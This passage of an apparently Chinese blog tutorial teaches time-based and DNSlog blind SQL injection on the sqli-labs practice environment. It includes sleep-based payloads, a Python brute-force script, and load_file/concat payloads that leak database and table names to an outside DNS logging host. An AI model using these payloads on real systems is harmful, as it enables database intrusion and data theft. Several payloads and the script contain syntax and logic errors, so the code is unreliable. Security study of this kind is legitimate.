-<p>插入想要查询的数据，进行字符串截取，再进行比对</p>
-<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>环境:sqli-lab less10</p>
-<p>id=1 id=1’ id=1’ and ‘1’ =’2</p>
-<p>进行一些简单的逻辑判断，均为一致的回显</p>
-<p>采取上述时间盲注</p>
-<p>id=1’ and if(left(user(),1)=’a’,0,sleep(3))–+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and if(left(user(),1)=&#x27;a&#x27; , 0 ,sleep(3))--+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
-<p>很明显页面延迟了刷新，将字符a变为r，页面立即执行，通过这种方式就能对数据库的数据进行查询<br>id=1’ and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=’e’,0,sleep(3))–+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27;,0,sleep(3))--+&#x27; limit 0 ,1</span><br></pre></td></tr></table></figure>
-<p>页面立即执行了，可见就是表名第一个字符就是E，但是这种效率会比较低这里对时间盲注比较推荐使用工具或者脚本<br>时间盲注脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url=&#x27;&#x27;</span><br><span class="line">database=&#x27;select schema_name from information_schema.schemata&#x27;</span><br><span class="line">column = &#x27;select column_name from information_schema.columns where table_name=&quot;table_name&quot;&#x27;</span><br><span class="line">table = &#x27;select table_name from information_schema.tables where table_schema=database()&#x27;</span><br><span class="line"></span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    for j in range(48,122):</span><br><span class="line">        payload = &#x27;&quot; and if(ascii(substr((&#123;&#125; limit 0,1),&#123;&#125;,1),sleep(2),1)--+&#x27;.format(database,i,j)</span><br><span class="line">        stime=time.time()</span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        etime = time.time()</span><br><span class="line">        if etime-stime ==2:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-<p>这里脚本先对库名进行爆破，爆完库名修改为表名，列名即可</p>
-<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><h2 id="Dnslog盲注"><a href="#Dnslog盲注" class="headerlink" title="Dnslog盲注"></a>Dnslog盲注</h2><p>每个网站都有对应的域名比如<a target="_blank" rel="noopener" href="https://www.test.com,每/">test.com</a> ，同样每个域名都有对应的ip地址，而将ip地址与域名这两者互相转换的中间人就是DNS，这两者每次转换都会留下一定的记录，我们就可以将这个称为dnslog，其实就是记录用户访问域名的信息</p>
-<p>原理：代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，我们可以通过布尔以及时间盲注获得内容，但整个过程效率低，需要发送很多请求进行判断，很可能触发安全设备的防护，所以需要一种方式减少请求，直接回显数据，这里可以使用dnslog实现注入</p>
-<p>代码实现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;select * from users where id = &#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;wrong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>平台:ceye.io dns在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息比如 curl xx.dnsurl，xx这里就是我们可以自主输入的命令字符，如果输入的whoami,就会返回当前用户<br>另外mysql的load_file可以发起请求</p>
-<p>例子:select load_file(concat(‘\\‘,’test’,’mysql.dnsurl\abc’));</p>
-<p>构造语句,利用Load_file函数发起请求，使用dnslog接受请求，获取数据</p>
-<p>核心语法:select load_file(concat(‘\\‘,(select database(),’mysql.dnsurl\abc’));</p>
-<p>通过sql语句查询内容，作为请求的一部分发送至dnslog，只要对这一部分的语句进行构造，就能实现有回显的sql注入，值得注意的是，这些数据格式和内容都有限制，需要处理</p>
-<h3 id="练习：-2"><a href="#练习：-2" class="headerlink" title="练习："></a>练习：</h3><p>环境：sqli-lab less9</p>
-<p>id=1 或者其他逻辑判断</p>
-<p>回显无效无法判断，如果有注入点就必然是盲注</p>
-<p>采取dnslog盲注</p>
-<p>id=1’ and select load_file(concat(‘\\‘,(select database(),’mysql.dnsurl\abc’));</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =&#x27;1&#x27; and select load_file(concat(&#x27;\\\\&#x27;,(select database(),&#x27;mysql.dnsurl\\abc&#x27;));--+&#x27;</span><br></pre></td></tr></table></figure>
-<p>前去dnslog平台就可以看到库名<br>然后查表名</p>
-<p>id=1’ and select load_file(concat(‘\\‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’mysql.dnsurl\abc’));–+</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;id=1&#x27; and select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;mysql.dnsurl\\abc&#x27;));--+&#x27;</span><br></pre></td></tr></table></figure>
-<p>可以看到表名，列名就按照老套路继续走<br>但是其实效率还是不高，推荐使用脚本跑</p>
 
       
     </div>
